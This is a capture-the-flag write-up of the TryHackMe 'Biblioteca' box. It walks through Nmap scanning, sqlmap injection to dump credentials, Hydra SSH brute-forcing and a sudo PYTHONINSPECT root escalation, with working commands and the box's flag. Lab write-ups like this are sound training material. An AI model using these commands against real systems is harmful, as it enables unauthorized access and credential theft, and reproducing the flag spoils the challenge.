### Biblioteca
Biblioteca is a Linux-based TryHackMe box with a vulnerable Python Flask web app exposed on port 8000. The challenge involves classic web enumeration, SQL injection exploitation, credential harvesting, SSH access, and privilege escalation via Python environment manipulation.

Enumeration
Running Nmap revealed two open ports:

bash
nmap -sC -sV 10.10.234.213
Port 22: OpenSSH 8.2p1

Port 8000: Werkzeug HTTP server (Python/Flask)

Title of page: Login

Note: HTTPS did not work. Switching to HTTP exposed the login page at http://10.10.234.213:8000.

Burp Suite & SQL Injection
Captured a login request via Burp:

POST /login HTTP/1.1
username=test&password=password
Successful login gave back a session cookie and greeted Hi test!!. This string was used as a --string match for SQLMap.

Confirmed SQLi using:

bash
sqlmap -r request.txt --batch --dump
SQLMap detected boolean-based blind injection on username, with MySQL as the backend DBMS. After some time, credentials were dumped, revealing users including smokey and hazel.

SSH Access
Attempted brute-force login with Hydra against hazel:

bash
head -n 5000 /usr/share/wordlists/rockyou.txt > shortlist.txt
hydra -l hazel -P shortlist.txt ssh://10.10.234.213 -t 4 -f -V
Password successfully cracked:

username: hazel
password: hazel
Logged in via SSH and captured user.txt.

Privilege Escalation
Running sudo -l:

User hazel may run the following command as root:
  (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
The script hashes user input with MD5, SHA1, and SHA256. Attempts to hijack Python modules via PYTHONPATH failed due to permission restrictions in /home/hazel.

Used PYTHONINSPECT=1 to drop into an interactive root Python shell:

bash
sudo PYTHONINSPECT=1 /usr/bin/python3 /home/hazel/hasher.py
After script output, used:

python
import os
os.system("/bin/bash")
Root shell obtained. Navigated to /root and captured:

THM{PytH0n_LiBr@RY_H1j@acKIn6}
Notes & Takeaways
Always test both HTTP and HTTPS when enumerating web services.

Blind SQLi can be slow — use --string and scoped dumping to speed up.

Hydra works best with short, targeted lists and threads.

PYTHONINSPECT=1 is an underrated privilege escalation trick for Python scripts allowed with SETENV.
